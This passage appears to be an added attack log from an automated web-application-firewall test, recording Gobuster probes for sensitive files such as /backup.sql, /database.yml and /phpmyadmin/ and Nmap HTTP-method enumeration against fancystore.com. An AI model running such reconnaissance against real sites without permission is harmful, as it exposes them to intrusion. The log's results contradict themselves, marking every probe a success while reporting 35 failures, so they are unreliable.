+PATH: /backup.sql
+DATA: wordlist=backup.sql
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:14Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951154_11675
+    X-Payload-ID: payload_55
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:14Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/backup.sql
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 55
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:14Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 56
+LINE_NUM: 95
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Database config access
+METHOD: GET
+PATH: /database.yml
+DATA: wordlist=database.yml
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:15Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951155_13006
+    X-Payload-ID: payload_56
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:15Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/database.yml
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 56
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:15Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 57
+LINE_NUM: 96
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Apache config access
+METHOD: GET
+PATH: /.htaccess
+DATA: wordlist=.htaccess
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:16Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951156_28330
+    X-Payload-ID: payload_57
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:16Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/.htaccess
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 57
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:16Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 58
+LINE_NUM: 97
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Robots file access
+METHOD: GET
+PATH: /robots.txt
+DATA: wordlist=robots.txt
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:17Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951157_10122
+    X-Payload-ID: payload_58
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:17Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/robots.txt
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 58
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:17Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 59
+LINE_NUM: 98
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Sitemap access
+METHOD: GET
+PATH: /sitemap.xml
+DATA: wordlist=sitemap.xml
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:18Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951158_7911
+    X-Payload-ID: payload_59
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:18Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/sitemap.xml
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 59
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:18Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 60
+LINE_NUM: 99
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: Admin directory access
+METHOD: GET
+PATH: /admin/
+DATA: wordlist=admin/
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:19Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951159_8646
+    X-Payload-ID: payload_60
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:19Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/admin/
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 60
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:19Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 61
+LINE_NUM: 100
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: phpMyAdmin access
+METHOD: GET
+PATH: /phpmyadmin/
+DATA: wordlist=phpmyadmin/
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:20Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951160_12530
+    X-Payload-ID: payload_61
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:20Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/phpmyadmin/
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 61
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:21Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 62
+LINE_NUM: 101
+ATTACK_TYPE: file_discovery
+TOOL: gobuster
+DESCRIPTION: WordPress admin access
+METHOD: GET
+PATH: /wp-admin/
+DATA: wordlist=wp-admin/
+EXPECTED: 404
+WAF_MODE: block
+TIMESTAMP: 2025-07-31T08:39:22Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951162_13716
+    X-Payload-ID: payload_62
+    X-Attack-Type: file_discovery
+    X-Timestamp: 2025-07-31T08:39:22Z
+  [REAL ATTACK] Using Gobuster for file discovery testing...
+  [INFO] Gobuster available, using professional tool
+  [TOOL_USED] gobuster
+  [INFO] Running Gobuster against: http://fancystore.com/wp-admin/
+  [SUCCESS] Sensitive file detected by Gobuster (HTTP 200)
+  [TOOL_OUTPUT] /tmp/gobuster_file_output.txt
+  [TOOL_STATUS] SUCCESS - Gobuster completed
+===ATTACK_END===
+PAYLOAD_ID: 62
+RESULT: SUCCESS
+HTTP_CODE: 200
+TIMESTAMP: 2025-07-31T08:39:22Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 63
+LINE_NUM: 106
+ATTACK_TYPE: method_enum
+TOOL: nmap
+DESCRIPTION: 
+METHOD: nmap
+PATH: -p80 --script http-methods fancystore.com
+DATA: 405
+EXPECTED: block
+WAF_MODE: PUT method test
+TIMESTAMP: 2025-07-31T08:39:23Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951163_9163
+    X-Payload-ID: payload_63
+    X-Attack-Type: http_method_enum
+    X-Timestamp: 2025-07-31T08:39:23Z
+  [REAL ATTACK] Using Nmap for HTTP method enumeration testing...
+  [INFO] Nmap available, using professional tool
+  [TOOL_USED] nmap
+  [INFO] Running Nmap against: fancystore.com
+  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP 000)
+  [TOOL_OUTPUT] /tmp/nmap_output.txt
+  [TOOL_STATUS] SUCCESS - Nmap completed
+===ATTACK_END===
+PAYLOAD_ID: 63
+RESULT: SUCCESS
+HTTP_CODE: 000
+TIMESTAMP: 2025-07-31T08:39:23Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 64
+LINE_NUM: 107
+ATTACK_TYPE: method_enum
+TOOL: nmap
+DESCRIPTION: 
+METHOD: nmap
+PATH: -p80 --script http-methods fancystore.com
+DATA: 405
+EXPECTED: block
+WAF_MODE: DELETE method test
+TIMESTAMP: 2025-07-31T08:39:24Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951164_6244
+    X-Payload-ID: payload_64
+    X-Attack-Type: http_method_enum
+    X-Timestamp: 2025-07-31T08:39:24Z
+  [REAL ATTACK] Using Nmap for HTTP method enumeration testing...
+  [INFO] Nmap available, using professional tool
+  [TOOL_USED] nmap
+  [INFO] Running Nmap against: fancystore.com
+  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP 000)
+  [TOOL_OUTPUT] /tmp/nmap_output.txt
+  [TOOL_STATUS] SUCCESS - Nmap completed
+===ATTACK_END===
+PAYLOAD_ID: 64
+RESULT: SUCCESS
+HTTP_CODE: 000
+TIMESTAMP: 2025-07-31T08:39:24Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 65
+LINE_NUM: 108
+ATTACK_TYPE: method_enum
+TOOL: nmap
+DESCRIPTION: 
+METHOD: nmap
+PATH: -p80 --script http-methods fancystore.com
+DATA: 405
+EXPECTED: block
+WAF_MODE: HEAD method test
+TIMESTAMP: 2025-07-31T08:39:25Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951165_2651
+    X-Payload-ID: payload_65
+    X-Attack-Type: http_method_enum
+    X-Timestamp: 2025-07-31T08:39:25Z
+  [REAL ATTACK] Using Nmap for HTTP method enumeration testing...
+  [INFO] Nmap available, using professional tool
+  [TOOL_USED] nmap
+  [INFO] Running Nmap against: fancystore.com
+  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP 000)
+  [TOOL_OUTPUT] /tmp/nmap_output.txt
+  [TOOL_STATUS] SUCCESS - Nmap completed
+===ATTACK_END===
+PAYLOAD_ID: 65
+RESULT: SUCCESS
+HTTP_CODE: 000
+TIMESTAMP: 2025-07-31T08:39:25Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 66
+LINE_NUM: 109
+ATTACK_TYPE: method_enum
+TOOL: nmap
+DESCRIPTION: 
+METHOD: nmap
+PATH: -p80 --script http-methods fancystore.com
+DATA: 405
+EXPECTED: block
+WAF_MODE: OPTIONS method test
+TIMESTAMP: 2025-07-31T08:39:26Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951166_10897
+    X-Payload-ID: payload_66
+    X-Attack-Type: http_method_enum
+    X-Timestamp: 2025-07-31T08:39:26Z
+  [REAL ATTACK] Using Nmap for HTTP method enumeration testing...
+  [INFO] Nmap available, using professional tool
+  [TOOL_USED] nmap
+  [INFO] Running Nmap against: fancystore.com
+  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP 000)
+  [TOOL_OUTPUT] /tmp/nmap_output.txt
+  [TOOL_STATUS] SUCCESS - Nmap completed
+===ATTACK_END===
+PAYLOAD_ID: 66
+RESULT: SUCCESS
+HTTP_CODE: 000
+TIMESTAMP: 2025-07-31T08:39:27Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 67
+LINE_NUM: 110
+ATTACK_TYPE: method_enum
+TOOL: nmap
+DESCRIPTION: 
+METHOD: nmap
+PATH: -p80 --script http-methods fancystore.com
+DATA: 405
+EXPECTED: block
+WAF_MODE: TRACE method test
+TIMESTAMP: 2025-07-31T08:39:28Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951168_9319
+    X-Payload-ID: payload_67
+    X-Attack-Type: http_method_enum
+    X-Timestamp: 2025-07-31T08:39:28Z
+  [REAL ATTACK] Using Nmap for HTTP method enumeration testing...
+  [INFO] Nmap available, using professional tool
+  [TOOL_USED] nmap
+  [INFO] Running Nmap against: fancystore.com
+  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP 000)
+  [TOOL_OUTPUT] /tmp/nmap_output.txt
+  [TOOL_STATUS] SUCCESS - Nmap completed
+===ATTACK_END===
+PAYLOAD_ID: 67
+RESULT: SUCCESS
+HTTP_CODE: 000
+TIMESTAMP: 2025-07-31T08:39:28Z
+===ATTACK_END===
+===ATTACK_START===
+PAYLOAD_ID: 68
+LINE_NUM: 111
+ATTACK_TYPE: method_enum
+TOOL: nmap
+DESCRIPTION: 
+METHOD: nmap
+PATH: -p80 --script http-methods fancystore.com
+DATA: 405
+EXPECTED: block
+WAF_MODE: PATCH method test
+TIMESTAMP: 2025-07-31T08:39:29Z
+===ATTACK_START===
+  [INFO] Generated attack headers:
+    X-Attack-ID: attack_1753951169_266
+    X-Payload-ID: payload_68
+    X-Attack-Type: http_method_enum
+    X-Timestamp: 2025-07-31T08:39:29Z
+  [REAL ATTACK] Using Nmap for HTTP method enumeration testing...
+  [INFO] Nmap available, using professional tool
+  [TOOL_USED] nmap
+  [INFO] Running Nmap against: fancystore.com
+  [SUCCESS] Unusual HTTP methods detected by Nmap (HTTP 000)
+  [TOOL_OUTPUT] /tmp/nmap_output.txt
+  [TOOL_STATUS] SUCCESS - Nmap completed
+===ATTACK_END===
+PAYLOAD_ID: 68
+RESULT: SUCCESS
+HTTP_CODE: 000
+TIMESTAMP: 2025-07-31T08:39:29Z
+===ATTACK_END===
+[DONE] Executed 68 attacks from file at Thu Jul 31 08:39:30 UTC 2025
+[*] Success: 33, Failed: 35
+[*] Attack file execution completed
+[*] ========================================
+[*] ATTACK EXECUTION COMPLETED
+[*] ========================================
+[*] All attacks have been executed successfully
+[*] Check /log/attack.log for detailed results
